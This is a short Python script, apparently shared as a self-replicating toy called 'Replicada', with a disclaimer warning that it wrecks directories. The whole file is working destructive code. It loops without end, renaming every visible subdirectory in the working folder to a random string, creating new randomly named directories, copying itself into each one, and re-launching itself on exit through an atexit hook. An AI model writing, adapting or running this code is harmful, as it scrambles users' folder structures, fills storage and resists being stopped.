'''
<DISCLAIMER>
THIS CODE REPLICATES ITSELF AND WILL CREATE NEW DIRECTORIES
PLEASE MIND THAT THIS WOULD FUCK UP YOUR DIRECTORIES, INCLUDING FILES AND FOLDERS
***DO NOT RUN THIS FILE IN ANY IMPORTANT DIRECTORIES***

self-replicating python file - Replicada by archisha69
'''

import os, shutil, random, string, sys, atexit

def _atexit():
    os.execv(sys.argv[0], sys.argv)
    
atexit.register(_atexit)
    
cwd = os.getcwd()

count = 0

#while count < 200:
while True:
    name = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(2, 32)))
    for i in os.listdir(cwd):
        name2 = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(2, 32)))
        if i.startswith(".") or not os.path.isdir(i): pass
        else: os.rename(i, name2)
    os.mkdir(name)
    os.chdir(name)
    shutil.copy(f"../{sys.argv[0]}", os.getcwd())
    os.chdir(cwd)
    count += 1
    
